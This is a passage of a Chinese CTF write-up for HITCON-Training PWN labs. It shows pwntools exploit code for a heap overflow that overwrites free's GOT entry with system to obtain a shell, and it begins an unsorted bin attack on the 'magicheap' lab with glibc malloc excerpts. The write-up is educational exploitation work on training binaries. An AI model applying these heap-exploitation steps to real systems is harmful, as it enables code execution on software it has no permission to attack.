class="code-snippet__number">0x10</span>,<span class="code-snippet__string">'bbbb'</span>)<span class="code-snippet__comment">#1</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x10</span>,<span class="code-snippet__string">'cccc'</span>)<span class="code-snippet__comment">#2</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x10</span>,<span class="code-snippet__string">'$0;'</span>)<span class="code-snippet__comment">#3</span></span></code><code><span class="code-snippet_outer">payload = <span class="code-snippet__string">'A'</span>*<span class="code-snippet__number">0x10</span> + p64(<span class="code-snippet__number">0</span>) + p64(<span class="code-snippet__number">0x81</span>)</span></code><code><span class="code-snippet_outer">edit(<span class="code-snippet__number">0</span>,payload)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">delete</span>(<span class="code-snippet__number">1</span>)</span></code><code><span class="code-snippet_outer">free_got = elf.got[<span class="code-snippet__string">'free'</span>]</span></code><code><span class="code-snippet_outer">payload = <span class="code-snippet__string">'A'</span> * <span class="code-snippet__number">0x40</span> + p64(<span class="code-snippet__number">0x10</span>) + p64(free_got)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x70</span>,payload)</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">show</span>(<span class="code-snippet__number">2</span>)</span></code><code><span class="code-snippet_outer">free_got = u64(p.recvuntil(<span class="code-snippet__string">'\x7f'</span>)[<span class="code-snippet__number">-6</span>:].ljust(<span class="code-snippet__number">8</span>,<span class="code-snippet__string">'\x00'</span>))</span></code><code><span class="code-snippet_outer">log.success(<span class="code-snippet__string">'free leak---&gt;'</span>+<span class="code-snippet__keyword">hex</span>(free_got))</span></code></pre></section><p>上面已经说过了，此时系统认为heap2是在free_got处的，所以修改heap2其实就是修改free_got。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">###get shell###</span></span></code><code><span class="code-snippet_outer">libc = LibcSearcher('free',free_got)</span></code><code><span class="code-snippet_outer">libc_base = free_got - libc.dump('free')</span></code><code><span class="code-snippet_outer">system = libc_base + libc.dump('system')</span></code><code><span class="code-snippet_outer">edit(2,p64(system))</span></code><code><span class="code-snippet_outer">delete(3)</span></code><code><span class="code-snippet_outer">p.interactive()</span></code></pre></section><p>此时我们已经在heap3布置好了/bin/sh，free(heap3)=system(/bin/sh)</p><figure><img data-ratio="0.31837606837606836" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/89_iasnX4UcZdZLLXcic52C8Us6MRQkyw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1Kkw9d1TkhIbE57LUYJibAnEeibGn4iasnX4UcZdZLLXcic52C8Us6MRQkyw/640?wx_fmt=png'" data-type="png" data-w="1404" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><hr style="box-sizing: inherit;background-color: rgba(51, 51, 51, 0.1);border-width: 0px;border-style: initial;border-color: initial;height: 1px;margin-bottom: 1.6842em;margin-left: auto;margin-right: auto;max-width: 100px;font family: &quot;Noto Serif&quot;, serif;font-size:19px;line-height:39px;;text-align: start;white-space: normal;"  /><h2 style="text-align: center;"><span style="font-size:20px;line-height:40px;;"><strong>lab14 magicheap</strong></span></h2><p><span style="font-size:20px;line-height:40px;;"><strong><br  /></strong></span></p><h3>Analysis</h3><figure><img data-ratio="0.6622516556291391" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/90_4LygogAuAuxMX2qR0bD8ibodganRwQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KOiabOp0d6RrMicw5vM8QSgYVXrC4LygogAuAuxMX2qR0bD8ibodganRwQ/640?wx_fmt=png'" data-type="png" data-w="1208" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>main</figcaption></figure><p>可以看到有create、edit、delete三个主要功能函数。</p><p>还有一个若输入的4896跳到判断magic是否大于0x1305，大于则转到l33t()</p><figure><img data-ratio="0.26857142857142857" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/91_FgKeka1NVXsyRjFFHykw5QYBDs9UFg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KG43d9Ds44E8PMan0yFfZ08FgFgKeka1NVXsyRjFFHykw5QYBDs9UFg/640?wx_fmt=png'" data-type="png" data-w="350" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /><figcaption>l33t</figcaption></figure><p>现在就是看看如何让magic大于0x1305。</p><figure><img data-backh="452" data-backw="544" data-ratio="0.8308823529411765" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/92_ibdwR7GEIF1piaUusNX95uVbicIO1w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KDRkTGZlnBzt7YfOusjl9cr3EOf4ibdwR7GEIF1piaUusNX95uVbicIO1w/640?wx_fmt=png'" data-type="png" data-w="544" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>create</figcaption></figure><p>和上一个差不多，size可控，有heaparray来管理heap。</p><figure><img data-backh="493" data-backw="477" data-ratio="1.0335429769392033" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/93_CzHw3RgY8CK4EVoxicC9YS74ezjiaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KSyfHAiaic7Kaib6m7d0b5Fcs5iagPZCzHw3RgY8CK4EVoxicC9YS74ezjiaA/640?wx_fmt=png'" data-type="png" data-w="477" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>edit</figcaption></figure><p>edit要求重新输入size，存在堆溢出。</p><figure><img data-backh="417" data-backw="465" data-ratio="0.896774193548387" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/94_gABYlrCgjDrBpxnp4AiahSRNp18dLA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KJibwF6TU4MDtQicFEcW2jbic2wqkgABYlrCgjDrBpxnp4AiahSRNp18dLA/640?wx_fmt=png'" data-type="png" data-w="465" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /><figcaption>delete</figcaption></figure><p>free并置空。</p><h3>How to exploit</h3><p>首先size可控并且可以溢出，但是并没有show功能，所以fastbin attack有点麻烦，unsorted bin attack是不二之选。</p><h3>Start to exploit</h3><p>unsorted bin attack的原理及攻击方法这里不再赘述。</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x20</span>,<span class="code-snippet__string">'aaa'</span>)<span class="code-snippet__comment">#0</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x80</span>,<span class="code-snippet__string">'bbb'</span>)<span class="code-snippet__comment">#1</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">create</span>(<span class="code-snippet__number">0x20</span>,<span class="code-snippet__string">'ccc'</span>)<span class="code-snippet__comment">#2</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">delete</span>(<span class="code-snippet__number">1</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">payload = <span class="code-snippet__string">'A'</span> * <span class="code-snippet__number">0x20</span> + p64(<span class="code-snippet__number">0</span>) + p64(<span class="code-snippet__number">0x90</span>) + p64(fake_fd) + p64(fake_bk)</span></code><code><span class="code-snippet_outer">edit(<span class="code-snippet__number">0</span>,<span class="code-snippet__keyword">len</span>(payload),payload)</span></code></pre></section><figure><img data-ratio="0.46308724832214765" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/95_4uHKtomNibCD4w3rdviclNCmAqJGFw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1K9yTNzkYm0iaU7a70ibG8CqN3UJA24uHKtomNibCD4w3rdviclNCmAqJGFw/640?wx_fmt=png'" data-type="png" data-w="596" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>可以看到目标已经进入unsorted bin链表。注意FIFO，与fastbin不同。此时的unsorted bin链表已经被我们破坏了，会出问题。</p><p>此时再malloc会把0x1135030申请掉，之后再申请理应到了fake chunk，但是会报错。</p><figure><img data-ratio="0.64" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/96_2L1Tbr6F0LOXYsCIqAdO6MKbY391Gw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KKr8fpib5me9bibjdej9OnQv1jf2L1Tbr6F0LOXYsCIqAdO6MKbY391Gw/640?wx_fmt=png'" data-type="png" data-w="725" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>估计是size检查不通过，所以报错，不过没关系。</p><figure><img data-ratio="0.3748211731044349" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/97_mZdyzwSH46u5JNhHLLzNzJMIPJK4nA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KqEibea3kqImVPhsYgWZPNkcBDmZdyzwSH46u5JNhHLLzNzJMIPJK4nA/640?wx_fmt=png'" data-type="png" data-w="699" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>一开始的堆布局是这个样子的，当我们申请了unsorted bin中的一个出去后，此时unsorted bin中只剩下一个chunk，反应快的人应该已经想到了。</p><figure><img data-ratio="0.24123422159887797" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/98_icfjZ4UicGBiciapnriaFdnfKauelQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KDEeGtXqpv1tRspvqIU44coH6u1tibWicfjZ4UicGBiciapnriaFdnfKauelQ/640?wx_fmt=png'" data-type="png" data-w="713" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>没错，此时因为unsoted只剩下一个chunk，所以fd、bk被填充为main_arena+offset。</p><figure><img data-backh="85" data-backw="463" data-ratio="0.183585313174946" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/99_3C5njJkTzhLeDkvicfGic4dllS4qRQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KxicdKJibm6XT7yBvEout9v7yb89o3C5njJkTzhLeDkvicfGic4dllS4qRQ/640?wx_fmt=png'" data-type="png" data-w="463" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;width: 100%;height: auto;"  /></figure><p>明显也是满足我们的条件的。</p><figure><img data-ratio="0.2294407894736842" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/100_bcJoibficFfTpaXicr3sEbCVvIE8yQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicNu8VXwWRNUicmK55GnWib1KiaeweNcr3As4N7vRS4rfOlzPowbxibcJoibficFfTpaXicr3sEbCVvIE8yQ/640?wx_fmt=png'" data-type="png" data-w="1216" style="box-sizing: inherit;border-width: 0px;border-style: initial;border-color: initial;vertical-align: middle;"  /></figure><p>关于刚才的问题：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__number">3733</span> <span class="code-snippet__keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span></code><code><span class="code-snippet_outer">        {</span></code><code><span class="code-snippet_outer">          bck = victim-&gt;bk;</span></code><code><span class="code-snippet_outer">          <span class="code-snippet__keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="code-snippet__number">2</span> * SIZE_SZ, <span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">              || __builtin_expect (chunksize_nomask (victim)</span></code><code><span class="code-snippet_outer">           &gt; av-&gt;system_mem, <span class="code-snippet__number">0</span>))</span></code><code><span class="code-snippet_outer">            malloc_printerr (<span class="code-snippet__string">"malloc(): memory corruption"</span>);</span></code><code><span class="code-snippet_outer">          size = chunksize (victim);</span></code></pre></section><p>第一句，判断bk是否指向本身或为空，若是就指向下一个chunk。</p><p>着重看一下判断条件：</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="code-snippet__number">2</span> * SIZE_SZ, <span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">              || __builtin_expect (chunksize_nomask (victim)</span></code><code><span class="code-snippet_outer">           &gt; av-&gt;system_mem, <span class="code-snippet__number">0</span>))</span></code></pre></section><p>chunk size &gt; 2*SIZE_SZ并且chunk size &gt; av-&gt;system_mem才行，但是我们应该满足啊.</p><p><img src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/101_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" data-type="png" data-ratio="0.109375" data-w="640"  /></p><p style="text-align: center;"><br  /></p><p style="text-align: center;"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247488476&amp;idx=1&amp;sn=85804f7bcf47c175a466f30e531e435a&amp;chksm=ec1f46e3db68cff5e7b6c4cb4091ec421956d604b8347b668fc81ed580db4d5ef31fe3bea1d1&amp;scene=21#wechat_redirect" data-itemshowtype="0" tab="innerlink" data-linktype="2">PWN学习路线指南</a><br  /></p><p><br  /></p><p><br  /></p><pre data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-style="background: rgb(255, 255, 255); letter-spacing: 0.544px; font family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size:13px;line-height:33px;; white-space: nowrap; line-height: 1.42857; word-break: break-all; border-width: 0px; border-style: initial; border-color: initial; border-radius: 4px; color: rgba(230, 230, 230, 0.9) !important;" class="js_darkmode__51" data-darkmode-color="rgba(230, 230, 230, 0.9)" data-darkmode-original-color="rgba(230, 230, 230, 0.9)" style="max-width: 100%;background: rgb(255, 255, 255);letter-spacing: 0.544px;font family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace;font-size:13px;line-height:33px;;white-space: nowrap;line-height: 1.42857;word-break: break-all;border-width: 0px;border-style: initial;border-color: initial;border-radius: 4px;box-sizing: border-box !important;overflow-wrap: break-word !important;color: rgba(230, 230, 230, 0.9) !important;"><p data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-darkmode-color="rgba(230, 230, 230, 0.9)" data-darkmode-original-color="rgba(230, 230, 230, 0.9)" style="max-width: 100%;min-height: 1em;letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-darkmode-color="rgb(136, 136, 136)" data-darkmode-original-color="rgb(136, 136, 136)" style="max-width: 100%;vertical-align: inherit;color: rgb(136, 136, 136);box-sizing: border-box !important;overflow-wrap: break-word !important;">原创投稿作者：Railgun</span></p><p data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-darkmode-color="rgba(230, 230, 230, 0.9)" data-darkmode-original-color="rgba(230, 230, 230, 0.9)" style="max-width: 100%;min-height: 1em;letter-spacing: 0.544px;white-space: normal;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;text-align: right;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span data-darkmode-bgcolor="rgb(36, 36, 36)" data-darkmode-original-bgcolor="rgb(255, 255, 255)" data-darkmode-color="rgb(136, 136, 136)" data-darkmode-original-color="rgb(136, 136, 136)" style="max-width: 100%;color: rgb(136, 136, 136);box-sizing: border-box !important;overflow-wrap: break-word !important;">作者博客：www.pwn4fun.com</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.5197505197505198" src="图片/HACK学习呀_2020-04-01_HITCON培训实验室-PWN题解/102_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" data-type="gif" data-w="962" style=""  /></p></pre>
                </div>
</div>
</body>
</html>